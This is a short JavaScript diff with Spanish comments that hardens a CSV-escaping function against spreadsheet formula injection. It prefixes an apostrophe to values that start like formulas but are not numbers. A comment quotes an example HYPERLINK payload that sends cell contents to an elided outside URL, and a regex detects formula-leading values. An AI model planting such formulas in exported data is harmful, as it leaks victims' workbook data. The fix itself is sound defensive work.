@@ -13,10 +13,19 @@
  * Excel en español lee 1.5 como 15.
  */
 
-/** Escapa un valor: entrecomilla si trae `"`, `;` o salto de línea. */
-function esc(v) {
-  const t = String(v ?? '');
-  return /[";\n]/.test(t) ? `"${t.replace(/"/g, '""')}"` : t;
+/**
+ * Un texto que EMPIEZA con `=`, `+`, `-`, `@` (o un tab / retorno) lo evalúa Excel como una FÓRMULA al abrir el
+ * archivo: el nombre de un cliente que vino de internet (`=HYPERLINK("https://…"&A2;"Ver")`) podía sacar datos
+ * del libro con un clic. Se le antepone `'` para que sea texto. Los NÚMEROS (`-12,50` de `csvNum`) no se tocan.
+ */
+const ES_NUMERO = /^-?[\d.,]+$/;
+const EMPIEZA_FORMULA = /^[=+\-@\t\r]/;
+
+/** Escapa un valor: neutraliza fórmulas, y entrecomilla si trae `"`, `;` o salto de línea. */
+export function esc(v) {
+  let t = String(v ?? '');
+  if (EMPIEZA_FORMULA.test(t) && !ES_NUMERO.test(t)) t = `'${t}`;
+  return /[";\n\r]/.test(t) ? `"${t.replace(/"/g, '""')}"` : t;
 }
 
 /** Número con coma decimal y dos decimales, como lo espera Excel en español. */
